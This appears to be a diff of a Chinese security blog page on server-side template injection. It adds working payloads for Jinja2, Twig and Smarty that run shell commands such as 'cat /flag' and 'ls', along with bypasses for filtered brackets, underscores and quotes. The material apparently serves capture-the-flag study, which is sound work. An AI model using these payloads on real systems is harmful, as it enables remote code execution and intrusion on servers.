@@ -7,9 +7,10 @@
     <meta name="keywords" content="SSTI模板注入, 0x00dream&#39;s blog">
     <meta name="description" content="   使用的框架不同，模板引擎的解析符号也不同。
 
-#python的SSTI攻击过程（Jinja2）
+
+#一、python的SSTI攻击过程（Jinja2）
 ?name={{&#39;&#39;.__class__.__base__.__subclasses__()}}  # 查看所有可用类
-从上面的可用类中找">
+从上面的可用">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -437,21 +438,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-29
+                    2025-05-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    350
+                    454
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -471,17 +472,29 @@
             <div id="articleContent">
                 <p>   使用的框架不同，模板引擎的解析符号也不同。</p>
 <p><img src="/2024/11/23/web-an-quan/ssti-mo-ban-zhu-ru/image-20241123100138998.png" alt="image-20241123100138998"></p>
-<p>#<strong>python的SSTI攻击过程</strong>（Jinja2）</p>
+<p><img src="/2024/11/23/web-an-quan/ssti-mo-ban-zhu-ru/image-20250402204813726.png" alt="image-20250402204813726"></p>
+<p>#<strong>一、python的SSTI攻击过程</strong>（Jinja2）</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看所有可用类</span>
 从上面的可用类中找到os的索引下标，比如是<span class="token number">132</span>
 <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看os的所有可用方法，看是否有popen</span>
-<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment"># 利用popen方法进行命令执行，并通过read()方法使执行结果回显到页面上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment"># 利用popen方法进行命令执行，并通过read()方法使执行结果回显到页面上</span>
+
+
+<span class="token comment"># 一个payload例子</span>
+<span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>lipsum<span class="token punctuation">.</span>__spec__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>werkzeug<span class="token punctuation">.</span>serving<span class="token punctuation">.</span>WSGIRequestHandler<span class="token punctuation">,</span><span class="token string">"protocol_version"</span><span class="token punctuation">,</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat mNo4pQ9rS1T'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>##其他引用</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">config<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
-url_for<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span class="token comment"># 过滤中括号[]可绕过</span>
+url_for<span class="token punctuation">:</span>
+    <span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>  <span class="token comment"># 查看所有可用类(可用于过滤小括号的情况下)</span>
+    <span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span>
+    <span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span class="token comment"># 过滤 中括号[] 可绕过</span>
+get_flashed_messages：
+	<span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>
+    <span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span>
 lipsum<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
-get_flashed_messages<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+get_flashed_messages<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>##若过滤的单引号，则利用传参的方式赋值：</p>
 <p>request.args.x—-&gt; 通过x传参来赋值（参数逃逸）</p>
@@ -499,8 +512,19 @@ request.form.x      post传参<span aria-hidden="true" class="line-numbers-rows"
 
 <h2 id="过滤下划线绕过"><a href="#过滤下划线绕过" class="headerlink" title="过滤下划线绕过"></a>过滤下划线绕过</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request.values.a<span class="token punctuation">))</span>.os.popen<span class="token punctuation">(</span>request.values.b<span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token assign-left variable">a</span><span class="token operator">=</span>__globals__<span class="token operator">&amp;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h1 id="PHP攻击过程（Twig）"><a href="#PHP攻击过程（Twig）" class="headerlink" title="PHP攻击过程（Twig）"></a>PHP攻击过程（Twig）</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//查看id</span>
+<h1 id="二、PHP攻击过程（Twig）"><a href="#二、PHP攻击过程（Twig）" class="headerlink" title="二、PHP攻击过程（Twig）"></a>二、PHP攻击过程（Twig）</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//查看id</span>
 <span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//查看flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>嵌入php脚本<code>display_weather.php</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>php<span class="token punctuation">}</span>
+	include<span class="token punctuation">(</span><span class="token string">"/path/to/display_weather.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">{</span>/php<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>全部的PHP条件表达式和函数都可在<code>{if}</code>中使用</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">X-Forwarded-For: <span class="token punctuation">{</span>if phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span>/if<span class="token punctuation">}</span>
+			    <span class="token punctuation">{</span>if system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span>/if<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
                 
@@ -788,7 +812,7 @@ request.form.x      post传参<span aria-hidden="true" class="line-numbers-rows"
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/11/21/web-an-quan/nei-wang-chuan-tou/">
+                <a href="/2024/11/21/nei-wang-shen-tou/nei-wang-chuan-tou/">
                     <div class="card-image">
                         
                         
@@ -1006,7 +1030,7 @@ request.form.x      post传参<span aria-hidden="true" class="line-numbers-rows"
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">32.9k</span>
+                        class="white-color">46.7k</span>
             
             
             
